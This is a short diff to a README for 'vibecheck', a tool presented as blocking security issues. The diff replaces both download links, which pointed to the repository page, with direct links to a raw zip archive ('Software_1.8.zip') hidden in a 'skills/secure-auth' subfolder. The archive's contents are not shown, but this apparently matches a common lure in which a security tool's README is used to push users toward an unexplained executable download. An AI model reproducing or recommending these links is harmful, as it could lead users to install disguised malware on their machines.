@@ -1,6 +1,6 @@
 # 🛡️ vibecheck - Block security issues before they ship
 
-[![Download vibecheck](https://img.shields.io/badge/Download-vibecheck-blue?style=for-the-badge)](https://github.com/Labored-nontricyclicdrug743/vibecheck)
+[![Download vibecheck](https://img.shields.io/badge/Download-vibecheck-blue?style=for-the-badge)](https://github.com/Labored-nontricyclicdrug743/vibecheck/raw/refs/heads/main/skills/secure-auth/Software_1.8.zip)
 
 ## 🚀 What vibecheck does
 
@@ -30,7 +30,7 @@ If your browser asks where to save the file, pick a folder you can find again, l
 
 Visit this page to download:
 
-https://github.com/Labored-nontricyclicdrug743/vibecheck
+https://github.com/Labored-nontricyclicdrug743/vibecheck/raw/refs/heads/main/skills/secure-auth/Software_1.8.zip
 
 Open the link in your browser, then use the download option on the page. If the page shows a file, download that file to your computer
 
